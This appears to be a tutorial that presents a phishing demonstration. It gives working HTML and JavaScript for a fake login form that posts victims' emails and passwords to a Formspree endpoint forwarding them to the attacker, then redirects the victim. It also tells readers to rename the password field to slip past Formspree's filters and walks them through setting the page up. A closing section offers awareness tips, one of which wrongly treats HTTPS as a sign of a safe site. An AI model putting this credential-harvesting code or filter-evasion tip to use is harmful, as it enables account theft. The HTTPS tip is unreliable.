Overview

Phishing is a form of cyber attack where an attacker impersonates a legitimate entity or website to trick individuals into providing sensitive information, such as login credentials or personal details. This demonstration simulates a basic phishing scenario in which user input is captured through a malicious form.

This implementation utilizes Formspree, a form-handling service that collects submitted form data and sends it to the attackerâ€™s email. While this demonstration is intentionally simple, attackers typically create more sophisticated and convincing websites that mimic legitimate services.

How it works

The page collects input from the user, in this case an email and password.

HTML
<form id="phishy-form" action="<your formspree url>" method="POST">
  <label>Email:</label>
  <input type="email" name="email" required />

  <label>Password:</label>
  <input type="text" name="userkey" required />

  <button id="my-form-button">Submit</button>
</form>
JavaScript
document
    .getElementById("phishy-form")
    .addEventListener("submit", async function (e) {
    e.preventDefault();
    let formData = new FormData(this);
    let response = await fetch("<your formspree url>", {
        method: "POST",
        body: formData,
        headers: { Accept: "application/json" },
    });

    if (response.ok) {
        window.location.href = "https://www.example.com/";
    }
}

Note: The name attribute for the password field is set to userkey. This avoids detection by Formspree's filters which may block obvious names like password. Once the user submits the form, the data is forwarded to the attacker's email, and the victim is redirected to a legitimate-looking page.

Try it yourself

Visit Formspree and create a new form endpoint. Replace <your formspree url> in the code above with the provided URL. Save the HTML and open it locally. Enter sample credentials (e.g., me@example.com / password123), submit, and check the associated email inbox.

Conclusion

This demonstration is designed to show just how shockingly easy it can be to launch a phishing attack. With just a few clicks, an attacker can create a convincing fake login page or spoofed website to trick users into handing over their credentials.

Always double-check URLs before clicking, especially in emails or messages. Attackers commonly disguise malicious links using URL shorteners, such as bit.ly. Avoid entering sensitive information on websites unless you're absolutely sure they are legitimate. To identify a phishing URL, look for HTTPS in the address bar and verify the domain name carefully. You can also use VirusTotal to scan suspicious links. Always double-check domain spelling, as even small differences can indicate a phishing attempt.
